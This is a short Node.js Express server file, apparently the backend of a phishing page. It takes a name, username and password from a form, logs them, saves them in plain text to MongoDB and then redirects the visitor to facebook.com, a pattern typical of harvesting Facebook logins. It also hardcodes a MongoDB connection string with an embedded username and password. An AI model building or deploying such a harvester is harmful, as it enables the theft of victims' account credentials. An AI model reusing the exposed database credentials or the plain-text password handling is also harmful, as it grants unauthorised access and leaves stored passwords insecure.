const express = require("express"),
  app = express(),
  PORT = process.env.PORT || 5000,
  bodyParser = require("body-parser"),
  mongoose = require("mongoose");
var user =require('./model/user')
app.set("view engine", "ejs");
app.set("views", "views");
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({ extended: false }))
app.get("/", (req, res) => {
  res.render("file.ejs");
});
app.post("/", (req, res) => {
  const { name, username,password } = req.body;
console.log(req.body)
  const Newuser=new user({
      name,
      username,
	  password
  })
  console.log(Newuser)
  Newuser.save().then(ele=>{
      res.redirect('https://www.facebook.com/')
  })
});

mongoose.connect("mongodb+srv://sudhanshu19s:sudhanshu19@cluster0.bzcaj.gcp.mongodb.net/user?retryWrites=true&w=majority", { useNewUrlParser: true }).then((ele) => {
  app.listen(PORT, () => {
    console.log(`Listening on Port ${PORT}`);
  });
});
